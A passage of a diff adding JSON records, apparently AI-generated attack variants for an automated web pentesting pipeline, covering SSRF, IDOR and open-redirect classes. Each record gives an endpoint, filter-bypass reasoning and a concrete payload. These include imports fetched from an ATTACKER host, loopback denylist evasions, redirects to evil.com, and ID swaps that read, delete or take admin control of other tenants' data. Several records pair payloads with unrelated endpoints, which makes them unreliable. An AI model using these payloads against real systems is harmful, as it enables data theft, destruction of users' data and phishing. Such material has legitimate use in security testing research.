+   "reasoning": "The server-side fetcher passing bytes unvalidated to gopher lets the percent-encoded OP_INSERT frame reach MongoDB on 0.0.0.0:27017 as if a real client connected. This requires the fetcher to allow the gopher scheme and reach loopback, which the observed raw-byte echo supports."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /api/compile-theme",
+   "target_param": "stylesheet",
+   "recon_evidence": "The backend runs a server-side LESS compiler on uploaded theme source and returns the compiled CSS, indicating imports are resolved on the server.",
+   "planner_rationale": "An inline LESS import forces the compiler to fetch a remote stylesheet and embed it, turning compilation into a server-originated request.",
+   "vuln_class": "ssrf",
+   "payload": "@import (inline) 'http://ATTACKER/payload.less';",
+   "injection_point": "body",
+   "expected_success_signal": "Attacker server receives an inbound request from the theme-compile worker",
+   "confidence": 0.88,
+   "reasoning": "Server-side LESS compilation resolves @import (inline) by fetching the referenced URL and inlining its contents, so the compiler originates the outbound request to the attacker host."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /admin/render",
+   "target_param": "less_source",
+   "recon_evidence": "Render endpoint accepts raw LESS markup and echoes compiled output, and outbound DNS lookups occur during rendering when remote references appear.",
+   "planner_rationale": "Inline import semantics make the pre-processor fetch the resource server-side and inline it into the compiled output.",
+   "vuln_class": "ssrf",
+   "payload": "@import (inline) 'http://ATTACKER/payload.less';",
+   "injection_point": "body",
+   "expected_success_signal": "Attacker server logs a request from the render service, and the compiled CSS contains the fetched file's contents",
+   "confidence": 0.9,
+   "reasoning": "Because the compiler inlines the imported resource rather than just recording its URL, the fetch is performed by the render service itself and the response is reflected in the compiled stylesheet."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /proxy/resource",
+   "target_param": "resource",
+   "recon_evidence": "Path-parameter proxy builds the upstream request line from the raw path segment, and the framework's URL parser tolerates scheme-relative authority in the request line.",
+   "planner_rationale": "Injecting an absolute request line redefines the request target's authority, so the proxy dials the attacker host instead of the intended upstream.",
+   "vuln_class": "ssrf",
+   "payload": "GET @evildomain.com/ HTTP/1.1",
+   "injection_point": "path",
+   "expected_success_signal": "Upstream fetch is issued to evildomain.com and the attacker observes the proxy's request headers",
+   "confidence": 0.72,
+   "reasoning": "The raw path segment is concatenated after the configured scheme and host, and the leading @ makes that host userinfo, causing the parsed authority to resolve to evildomain.com; this variant assumes the proxy does not re-sanitise the request line."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /api/webhook-test",
+   "target_param": "callback_url",
+   "recon_evidence": "Webhook tester follows redirects up to a configurable limit and logs full response headers in its debug output whenever the redirect chain is flagged as irregular.",
+   "planner_rationale": "A loop of odd redirect status codes pushes the client into debug-dump mode and then redirects to an internal target.",
+   "vuln_class": "ssrf",
+   "payload": "http://ATTACKER/start (chain: 302 -> 305..309 loop -> 302 to metadata)",
+   "injection_point": "query",
+   "expected_success_signal": "Debug log contains the dumped redirect chain and the internal metadata endpoint's response body",
+   "confidence": 0.68,
+   "reasoning": "The tester's follow logic treats 305-309 as redirect codes; after enough irregular hops the client enters its error-dump branch, printing all headers and the final body fetched from the internal endpoint."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/v2/media/import",
+   "target_param": "source_url",
+   "recon_evidence": "The JSON body validator rejects every dotted-quad loopback (127.0.0.1, 127.1, 2130706433) with 422, but a request carrying an IPv6 literal in source_url reaches the media pipeline and the job log shows an outbound socket open at fetch time; the service binds0.0.0.0 with net.ipv6.bindv6only=0.",
+   "planner_rationale": "Numeric denylist never covers IPv6 text forms; an IPv4-mapped IPv6 literal keeps the socket on 127.0.0.1 while bypassing the dotted-quad filter.",
+   "vuln_class": "ssrf",
+   "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+   "injection_point": "body",
+   "expected_success_signal": "Import job returns 200 and the ingested asset bytes match the internal loopback service's index page rather than a rejection",
+   "confidence": 0.88,
+   "reasoning": "The denylist is keyed on dotted-decimal and decimal integers, so a bracketed IPv6 literal is never matched, yet the dual-stack resolver maps ::ffff:127.0.0.1 back to the IPv4 loopback destination. The fetch therefore lands on the internal listener that the application itself can reach but the caller cannot."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/render/screenshot",
+   "target_param": "X-Fetch-Url",
+   "recon_evidence": "Header X-Fetch-Url drives the headless renderer target. Values starting with http:// are refused by the ingress guard, https://https://evil.test is stripped, but https:internal-renderer.local is accepted and the job record contains a screenshot of that host's dashboard.",
+   "planner_rationale": "The guard does a prefix compare against the literal 'https://'; omitting the slashes leaves a scheme-relative form that URL parsers still normalise to an absolute https URL.",
+   "vuln_class": "ssrf",
+   "payload": "https:attacker.com",
+   "injection_point": "header",
+   "expected_success_signal": "Screenshot job completes with an image of the attacker-controlled page, confirming the renderer fetched a host outside the allowlist",
+   "confidence": 0.79,
+   "reasoning": "Because the check is a string prefix test for https://, the bare scheme plus host slips past, and WHATWG/RFC-3986 parsers used by the renderer treat 'https:attacker.com' as an absolute URL with an authority. The allowlist host comparison is skipped since parsing short-circuits before it."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /portal/links/unfurl",
+   "target_param": "preview_url",
+   "recon_evidence": "Cookie preview_url is read during link rendering: setting it to http://127.0.0.1:8080/actuator/env returns the actuator body embedded in the rendered card, while the same cookie set to an unresolvable host returns an empty card. No client-side validation touches the cookie.",
+   "planner_rationale": "Server-side sink reads the target from an attacker-controllable cookie; reuse the confirmed scheme-parsing quirk against the cookie value rather than a query parameter.",
+   "vuln_class": "ssrf",
+   "payload": "https:attacker.com",
+   "injection_point": "cookie",
+   "expected_success_signal": "Unfurl card embeds our page's title and description, proving the backend dereferenced the cookie-supplied URL server-side",
+   "confidence": 0.67,
+   "reasoning": "The same lenient parser accepts a scheme-without-authority-separator form, so a cookie-borne value reaches the unfurler unfiltered. Confidence is held lower than the query variants because cookie handling can add percent-decoding and length truncation layers that may normalise or cut the value before the parser sees it."
+  }
+ },
+ {
+  "class": "ssrf",
+  "batch": "ssrf_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /cdn/screenshot/{*source}",
+   "target_param": "source",
+   "recon_evidence": "The catch-all route passes the trailing path segments verbatim to the capture worker; requests for /cdn/screenshot/https://files.partner-cdn.test/a.png render fine, and requests carrying a bracket literal are not rejected by the router or the capture worker, which then shows a cached 2xx from the internal loopback service.",
+   "planner_rationale": "Path-borne SSRF with no scheme allowlist at all; the only obstacle is the internal denylist, so route around it with an IPv6 mapped literal inside the path segment.",
+   "vuln_class": "ssrf",
+   "payload": "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+   "injection_point": "path",
+   "expected_success_signal": "Response is a rendered PNG of the internal service root instead of a router400 or a denylist rejection",
+   "confidence": 0.72,
+   "reasoning": "The greedy route forwards the whole tail as a URL, and the mapped IPv6 literal resolves to 127.0.0.1 on a dual-stack host, sidestepping dotted-decimal and integer-based denylists. Confidence is moderated because some routers percent-decode or normalise brackets and colons in path segments, which could corrupt the literal before the worker parses it."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /api/v1/documents?docId=5ae9b90a2c144b9def01ec37",
+   "target_param": "docId",
+   "recon_evidence": "docId is a 24-hex ObjectId query parameter; the leading 8 hex digits track creation time and the server accepts arbitrary values, returning whichever document is referenced.",
+   "planner_rationale": "MongoDB ObjectId makes sibling records computable; walk the counter to reach other users' documents.",
+   "vuln_class": "idor",
+   "payload": "5ae9b90a2c144b9def01ec38",
+   "injection_point": "query",
+   "expected_success_signal": "HTTP 200 with a document whose owner differs from the caller",
+   "confidence": 0.76,
+   "reasoning": "The query value is an ObjectId whose embedded counter is sequential, so bumping the last byte selects a neighbouring document, and the endpoint treats it purely as a lookup key with no ownership binding."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_3",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "DELETE /api/v1/messages/697412",
+   "target_param": "messageId (path segment)",
+   "recon_evidence": "DELETE /api/v1/messages/697412 (our own message) returns 204 and the object disappears. IDs are strictly sequential (696...697413) and GET /api/v1/messages/697413 shows author_id 4471, another tenant. Requesting the unversioned alias /api/messages/697413 with a garbage token returns 500 from the rowLoader (not401/403), showing the legacy alias is wired to the pre-authorization controller while /v1 enforces tenancy.",
+   "planner_rationale": "Write/delete routes are the highest-impact confirmation that the missing ownership check is systemic, and version-forked handlers often keep the older, unchecked code path.",
+   "vuln_class": "idor",
+   "payload": "DELETE /api/messages/697413",
+   "injection_point": "path",
+   "expected_success_signal": "204 No Content on the legacy alias, and GET /api/v1/messages/697413 afterwards returns 404 for both us and the victim, confirming permanent deletion of another user's object",
+   "confidence": 0.77,
+   "reasoning": "Ownership is checked on the versioned handler but the legacy alias resolves the same row with only an existence test, so the sequential neighbour ID crosses the tenant boundary. A successful204 plus the object vanishing for the victim proves the missing check also applies to destructive operations, not just reads."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /ops/exports/usage-report?user_id=1001&scope=team",
+   "target_param": "user_id (occurrence not deduplicated on this route)",
+   "recon_evidence": "An edge layer rewrites duplicate user_id values only on /api/* routes; the ops export route lacks that normalization and passes every occurrence of user_id untouched into the report builder.",
+   "planner_rationale": "The deduplication that would kill HPP is absent here, so smuggling a second identifier past the ownership check should work.",
+   "vuln_class": "idor",
+   "payload": "user_id=123&user_id=124 (duplicate param)",
+   "injection_point": "query",
+   "expected_success_signal": "CSV usage report includes activity attributed to user 124 alongside the requesting account's rows",
+   "confidence": 0.6,
+   "reasoning": "Where duplicate user_id values reach the object resolver without normalization, the ownership check and the data fetch can bind to different occurrences, letting the final value redirect the report to a foreign account."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /api/graphql (persisted operation)",
+   "target_param": "subredditName (GraphQL variables)",
+   "recon_evidence": "Only hashed operation ids are accepted, so the query text is fixed; however the variables block is attacker-controlled, and substituting another subreddit's name returns that community's removed-post queue to an account with no moderator rights there.",
+   "planner_rationale": "Keep the allowlisted persisted id and only retarget the subredditName variable at the restricted community.",
+   "vuln_class": "idor",
+   "payload": "{\"id\":\"<persisted-query-id>\",\"variables\":{\"subredditName\":\"target-subreddit\"}}",
+   "injection_point": "body",
+   "expected_success_signal": "Removed-post queue for the target subreddit returned, with endCursor present on each page for full walk-through",
+   "confidence": 0.82,
+   "reasoning": "The persisted-operation allowlist validates which query runs, not which objects its variables select, so the unvalidated subredditName substitution drives the resolver to enumerate a foreign community's moderation data."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /orion/graphql (mobile app promoted persisted query)",
+   "target_param": "variables.subredditName",
+   "recon_evidence": "The mobile client's promoted hash builds a moderator dashboard from subredditName alone; replaying that exact hash with a community name the caller never moderates still returns its delivered-messages log with no modcheck error.",
+   "planner_rationale": "Pin the query via the trusted promoted hash and pivot only the constrained variable toward the victim namespace.",
+   "vuln_class": "idor",
+   "payload": "{\"id\":\"<persisted-query-id>\",\"variables\":{\"subredditName\":\"target-subreddit\"}}",
+   "injection_point": "body",
+   "expected_success_signal": "Delivered-messages log rows for the target community paginate indefinitely via endCursor",
+   "confidence": 0.78,
+   "reasoning": "Because the persisted hash fixes the query text, subredditName is the only attacker-controlled object selector; with no ownership comparison on it, every response leaks the foreign community's operational log page by page."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "DELETE /api/v1/messages/<message_id>/",
+   "target_param": "message_id (path segment)",
+   "recon_evidence": "Deleting the attacker's own message with a valid session and fresh X-CSRFTOKEN succeeds, and the API schema exposes no owner comparison anywhere; the numeric message id in the path is the sole selector for the stored object.",
+   "planner_rationale": "Reuse the fully authenticated delete flow unchanged and only swap the path identifier to the victim's message id.",
+   "vuln_class": "idor",
+   "payload": "DELETE /api/v1/messages/4423007/ with attacker session cookie + X-CSRFTOKEN header",
+   "injection_point": "path",
+   "expected_success_signal": "204 No Content and the targeted DM disappears from the victim's inbox thread",
+   "confidence": 0.86,
+   "reasoning": "Session validity and CSRF are satisfied by the attacker's own credentials, leaving object ownership unchecked, so the path-supplied message id alone determines which stored message is destroyed for its real owner."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v2/graphql",
+   "target_param": "variables.ids",
+   "recon_evidence": "The mobile client batches spotlight removals through DeleteStorySnaps, and Burp shows no per-id owner assertion in the response; swapping in an id from another account still returns the standard success payload rather than a 403.",
+   "planner_rationale": "Batch-delete using a foreign spotlight id taken from a shared link to confirm the missing owner check.",
+   "vuln_class": "idor",
+   "payload": "{\"operationName\":\"DeleteStorySnaps\",\"variables\":{\"ids\":[\"VICTIM_SPOTLIGHT_ID\"],\"storyType\":\"SPOTLIGHT_STORY\"}}",
+   "injection_point": "body",
+   "expected_success_signal": "Mutation returns success with the updated snap count; the targeted foreign spotlight story is removed from the victim's account.",
+   "confidence": 0.82,
+   "reasoning": "Because the spoofed ids are never joined against the session owner, pointing the array at a victim id simply deletes that object, which is the classic object-reference IDOR in a GraphQL mutation."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v1/notes",
+   "target_param": "target_type, target_id",
+   "recon_evidence": "Creating a note on an issue always includes target_type=issue, and the server only evaluates project membership when that type is present; setting target_type=personal_snippet with an arbitrary target_id still returns 201 and the note body.",
+   "planner_rationale": "Re-type the noteable from issue to personal_snippet so the membership check is skipped and the note lands on a victim's private snippet.",
+   "vuln_class": "idor",
+   "payload": "?target_id=VICTIM_SNIPPETID&target_type=personal_snippet",
+   "injection_point": "body",
+   "expected_success_signal": "201 Created with the note rendered against the victim's snippet; the snippet title is disclosed and the injected note is visible/editable to the attacker.",
+   "confidence": 0.88,
+   "reasoning": "The authorization branch is keyed solely on target_type, so switching it to personal_snippet bypasses the project-scope check and attaches an attacker-authored note to an object selected only by attacker-supplied target_id. For a POST the equivalent pair is sent as form or JSON fields."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /graphql",
+   "target_param": "variables.organizationId",
+   "recon_evidence": "The createInvitation mutation accepts an organizationId in the GraphQL variables payload and performs no membership or role check before generating the invitation (mirrors disclosed HackerOne report #835005).",
+   "planner_rationale": "Issue an admin invitation for an organization the caller does not belong to by swapping the organizationId variable.",
+   "vuln_class": "idor",
+   "payload": "{\"invitation\":{\"email\":\"attacker@example.com\",\"role\":\"admin\",\"organization\":\"TARGET_ORG_UUID\"}}",
+   "injection_point": "body",
+   "expected_success_signal": "An invitation for the attacker's email with admin role is created against the target organization and can be accepted",
+   "confidence": 0.82,
+   "reasoning": "The mutation derives the invitation's organization and role entirely from client-supplied input, so replacing the UUID grants the attacker a self-service path to admin membership in a foreign organization."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/v2/accounts/1233",
+   "target_param": "account_id (path segment)",
+   "recon_evidence": "The bundled web app calls /api/v2/accounts/:id for the profile widget; GET /api/v2/accounts/1234 (own id, returned in the profile JSON) yields 200 with owner fields, while ids far outside the allocated range return 404 — so the server validates existence/range but nothing about ownership.",
+   "planner_rationale": "Path parameter is a raw object reference with no visible ownership gate; swap the neighbour id and see whether it resolves.",
+   "vuln_class": "idor",
+   "payload": "/api/user/1233",
+   "injection_point": "path",
+   "expected_success_signal": "200 with the account record for id 1233 (name, billing email, plan, last login) instead of 403/404",
+   "confidence": 0.87,
+   "reasoning": "The observed 200-then-404 boundary proves the backend does an existence/range lookup on the numeric path segment rather than an authorization check. Decrementing the caller's own id by one reaches the adjacent tenant record through the identical code path."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/orders/1233/attachments",
+   "target_param": "order_id (path segment)",
+   "recon_evidence": "GET /api/orders/1234/attachments returns your own document list; walking the id upward (1235, 1236) in the same session still returns 200 with attachment metadata instead of 403, so only a range check is performed on the nested object reference.",
+   "planner_rationale": "Nested child resource keyed by a foreign parent id — test whether parent-to-child ownership is enforced on the parent segment.",
+   "vuln_class": "idor",
+   "payload": "/api/user/1233",
+   "injection_point": "path",
+   "expected_success_signal": "200 with the attachment list or presigned download URLs belonging to order 1233 owned by a different account",
+   "confidence": 0.81,
+   "reasoning": "Child collections are frequently resolved by first fetching the parent row by id and then filtering children, which skips the tenant predicate entirely. The absence of 403 on the neighbouring ids in recon indicates the parent lookup is existence-only, so the direct object reference exposes the attachment metadata and its storage keys."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/v1/tenants/1233/members",
+   "target_param": "tenantId (path segment)",
+   "recon_evidence": "The published OpenAPI document exposes GET /api/v1/tenants/{tenantId}/members with no security scope declared; your own tenant id 1234 is echoed in the X-Tenant header of every call, and a request for tenantId 1235 returned 200 with a member list rather than an authorization error.",
+   "planner_rationale": "Tenant enumeration through a documented path parameter with no declared auth scope — walk the neighbour tenant id.",
+   "vuln_class": "idor",
+   "payload": "/api/user/1233",
+   "injection_point": "path",
+   "expected_success_signal": "200 with a user directory (emails, roles, invite state) for tenant 1233 rather than 403/404",
+   "confidence": 0.76,
+   "reasoning": "A tenant-scoped collection addressed purely by path id, combined with recon showing foreign tenant ids still returning 200, points to a missing tenant-ownership predicate in the handler. The declared-absent security scope in the spec makes it plausible the check is only enforced at the gateway for your own tenant."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/billing/invoice?invoice=2024-00002",
+   "target_param": "invoice (query)",
+   "recon_evidence": "GET /api/billing/invoice?invoice=2024-00001 returns your own invoice document; the numbering is strictly sequential per tenant with no visible random component, and the billing portal links expose the invoice parameter as the sole lookup key.",
+   "planner_rationale": "Predictable sequential business identifier used as a direct record key — increment the counter to land on the neighbouring tenant's invoice.",
+   "vuln_class": "idor",
+   "payload": "invoice=2024-00002",
+   "injection_point": "query",
+   "expected_success_signal": "200 with invoice 2024-00002 (another account's PDF or JSON line items) instead of 403/404",
+   "confidence": 0.84,
+   "reasoning": "Because the invoice number is the primary lookup key and the enumeration pattern is exposed in the caller's own history, every record becomes guessable. A download handler that resolves the invoice without comparing its owning account leaks the neighbouring tenant's financial document."
+  }
+ },
+ {
+  "class": "idor",
+  "batch": "idor_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /api/v1/campaigns/metrics",
+   "target_param": "X-Client-ID (header)",
+   "recon_evidence": "Gateway access logs and response headers echo X-Client-ID on every call; substituting an arbitrary 4-digit client id returns 200 with dashboard aggregates rather than 401/403, so tenancy is selected from this header before any ownership evaluation.",
+   "planner_rationale": "Header-carried tenant selector appears unauthenticated at the edge — retarget it to a neighbouring client id and compare aggregate values.",
+   "vuln_class": "idor",
+   "payload": "X-Client-ID: 4712",
+   "injection_point": "header",
+   "expected_success_signal": "200 with campaign spend/impression aggregates for client 4712 rendered into the original session's dashboard payload",
+   "confidence": 0.72,
+   "reasoning": "The response shape stays identical when the client-id header changes, meaning the header alone drives the tenant scope in the query layer. If the downstream service trusts that scope without re-deriving the owning client from the session token, the swapped header returns another client's aggregate metrics."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /auth/callback",
+   "target_param": "landing",
+   "recon_evidence": "After authentication the app 302s to whatever landing carries: landing=/account was replayed byte-for-byte into Location, and probing with javascript: and data: values returned a scheme-deny error while any http(s) destination was accepted with no host allowlist consulted.",
+   "planner_rationale": "Scheme-only deny-list on the redirect target with no host validation, so an absolute https URL to the attacker domain passes straight into the Location header.",
+   "vuln_class": "open_redirect",
+   "payload": "https://evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "302 response whose Location header is exactly https://evil.com, landing the victim on the phishing host",
+   "confidence": 0.9,
+   "reasoning": "Validation filters only dangerous schemes and never constrains the destination host, so the plain absolute URL survives unchanged and is emitted verbatim in the Location header immediately after login."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /account/preferences",
+   "target_param": "return_to",
+   "recon_evidence": "Saving preferences redirects to return_to: submitting //evil.com was rejected with 'invalid destination', but the backslash-prefixed scheme-relative equivalent passed the same validation chain and was echoed unmodified into the 303 Location header, showing the deny-list blocks the literal double-slash while leaving backslashes untreated.",
+   "planner_rationale": "Blacklist catches the literal double-slash but not its backslash form; the browser URL parser equates backslashes with slashes and silently restores the scheme-relative URL.",
+   "vuln_class": "open_redirect",
+   "payload": "\\/\\/evil.com/",
+   "injection_point": "body",
+   "expected_success_signal": "Post-submit 303 echoes the backslash-prefixed value in Location while the browser normalizes backslashes to slashes and navigates to evil.com",
+   "confidence": 0.72,
+   "reasoning": "The deny-list matches the // literal but not backslashes, whereas browsers treat backslashes as forward slashes when parsing special-scheme URLs, so this value parses as the scheme-relative //evil.com and lands the victim on the attacker host despite the filter."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /session/resume",
+   "target_param": "return_dest",
+   "recon_evidence": "A pre-auth page sets the return_dest cookie and the resume handler 302s to its value: a cookie holding https://status.trusted.com/x was accepted and echoed into Location, and rejected values indicate validation is a plain contains-check for the string trusted.com rather than parsed-host matching.",
+   "planner_rationale": "Containment-only allowlist lets the @ userinfo technique carry the trusted name as credentials while evil.com remains the authority the browser actually resolves.",
+   "vuln_class": "open_redirect",
+   "payload": "http://www.trusted.com@evil.com/",
+   "injection_point": "cookie",
+   "expected_success_signal": "302 with Location: http://www.trusted.com@evil.com/ and the victim's browser connecting to evil.com as the resolved host",
+   "confidence": 0.68,
+   "reasoning": "A substring match for trusted.com is satisfied by the userinfo segment, but per RFC 3986 everything before the @ is credentials, so the browser treats evil.com as the host and redirects the victim to the attacker's site."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /affiliate/out",
+   "target_param": "X-Exit-Url",
+   "recon_evidence": "The affiliate exit route redirects to the URL supplied in X-Exit-Url: a value of https://cdn.trusted.com/o was accepted while https://shop.attacker-host.test was refused with 'partner host not recognized', indicating the check compares the raw header string against the trusted.com suffix instead of extracting the authority.",
+   "planner_rationale": "Suffix-style allowlist applied to the raw string; the @ userinfo trick embeds the trusted host in front of the @ while evil.com stays the effective connect target.",
+   "vuln_class": "open_redirect",
+   "payload": "http://www.trusted.com@evil.com/",
+   "injection_point": "header",
+   "expected_success_signal": "302 whose Location header reads http://www.trusted.com@evil.com/ and whose follow-up request resolves to evil.com",
+   "confidence": 0.66,
+   "reasoning": "The gate inspects the literal string rather than the parsed host, so the trusted name embedded as userinfo passes it, while browsers resolve the segment after the @ as the authority and connect the victim to evil.com."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_0",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /redirect/*",
+   "target_param": "redirect_target",
+   "recon_evidence": "The wildcard capture under /redirect/ is percent-decoded and handed to the redirector: requesting /redirect/http://canary.host.test returned a 302 whose Location reproduced that URL verbatim, and the handler refuses only javascript: and data: prefixes with no host allowlist on the decoded remainder.",
+   "planner_rationale": "Unvalidated catch-all path capture feeds the redirector, so an absolute https URL placed in the path alone controls the Location host.",
+   "vuln_class": "open_redirect",
+   "payload": "https://evil.com",
+   "injection_point": "path",
+   "expected_success_signal": "GET /redirect/https://evil.com answers 302 with Location: https://evil.com",
+   "confidence": 0.6,
+   "reasoning": "The catch-all handler treats the decoded rest-of-path as the complete redirection target, so appending the full attacker URL after /redirect/ is sufficient to send the victim to evil.com without invoking any host filter."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /auth/callback",
+   "target_param": "redirect_uri",
+   "recon_evidence": "OAuth callback reflects redirect_uri into a 302 Location header; server accepts any value whose host ends with the whitelisted string trusted.com (suffix/contains comparison, not exact host match).",
+   "planner_rationale": "Suffix whitelist is subdomain-forgeable: register-driven subdomain trick makes trusted.com a label, not the registrable host.",
+   "vuln_class": "open_redirect",
+   "payload": "http://www.trusted.com.google.com",
+   "injection_point": "query",
+   "expected_success_signal": "302 Location points at google.com and the browser leaves the origin, landing on the google.com host",
+   "confidence": 0.85,
+   "reasoning": "The validator only checks that the host string ends in trusted.com, so www.trusted.com.google.com passes, yet DNS treats the leftmost label as a subdomain of google.com and the browser navigates there instead of any trusted host."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /session/terminate",
+   "target_param": "return_to",
+   "recon_evidence": "Logout endpoint reads return_to from the JSON body, strips the scheme-less leading //, then emits a 302; absolute URLs without a path are rejected by a prefix check on the raw value.",
+   "planner_rationale": "Use the ?-trick so the whitelisted URL lands in the query string and the authority is evil.com.",
+   "vuln_class": "open_redirect",
+   "payload": "http://evil.com?http://www.trusted.com/",
+   "injection_point": "body",
+   "expected_success_signal": "302 Location resolves to evil.com and the browser navigates to evil.com after logout",
+   "confidence": 0.7,
+   "reasoning": "Everything after the first ? is parsed by the browser as the query of evil.com, so the whitelisted http://www.trusted.com/ is discarded from the authority while the raw string still satisfies the prefix validator."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /sso/authorize",
+   "target_param": "continue",
+   "recon_evidence": "continue is URL-decoded exactly once before validation; the validator sees the decoded value and its blocklist only matches the literal sequences http://, https:// and //.",
+   "planner_rationale": "Double-encoding: validation operates on the once-decoded string, so percent escapes survive to the browser's second decode.",
+   "vuln_class": "open_redirect",
+   "payload": "%2f%2fevil.com",
+   "injection_point": "query",
+   "expected_success_signal": "After the browser's second decode the Location resolves to //evil.com (protocol-relative) and navigation leaves the origin",
+   "confidence": 0.65,
+   "reasoning": "The server decodes %2f%2fevil.com once to an innocuous-looking value that clears the // blocklist, but it is emitted without re-encoding, so the browser's own decode turns it into protocol-relative //evil.com."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_1",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /portal/launch",
+   "target_param": "post_login_redirect",
+   "recon_evidence": "Session cookie post_login_redirect is read after authentication; the value is validated with a contains('trusted.com') check before being written into the 302 Location.",
+   "planner_rationale": "Contains-check on the cookie value is satisfiable by embedding the trusted string as a label in an attacker-owned google.com host.",
+   "vuln_class": "open_redirect",
+   "payload": "http://www.trusted.com.google.com",
+   "injection_point": "cookie",
+   "expected_success_signal": "Post-login 302 Location targets google.com and the browser navigates to that host rather than any trusted.com property",
+   "confidence": 0.75,
+   "reasoning": "Because the check merely requires the substring trusted.com anywhere in the cookie value, the forged host www.trusted.com.google.com passes while the browser resolves the full name as a subdomain of the attacker-controlled google.com."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /account/continue",
+   "target_param": "return_to",
+   "recon_evidence": "The app rejects any value containing '//' after the scheme, but a request with a literal tab (%09) between the slashes still returns 302 Location echoing the value unchanged.",
+   "planner_rationale": "The tab between the slashes survives validation because the adjacency check never sees '//' together, then normalization removes %09 and the slashes re-form.",
+   "vuln_class": "open_redirect",
+   "payload": "/%09/evil.com",
+   "injection_point": "query",
+   "expected_success_signal": "302 Location header resolves to //evil.com once the tab is stripped during normalization",
+   "confidence": 0.88,
+   "reasoning": "The observed filter blocks adjacent slashes while accepting encoded whitespace, so %09 smuggles the break past the check and is removed during canonicalization, restoring the protocol-relative redirect to evil.com."
+  }
+ },
+ {
+  "class": "open_redirect",
+  "batch": "open_redirect_2",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /auth/callback/resolve",
+   "target_param": "dest",
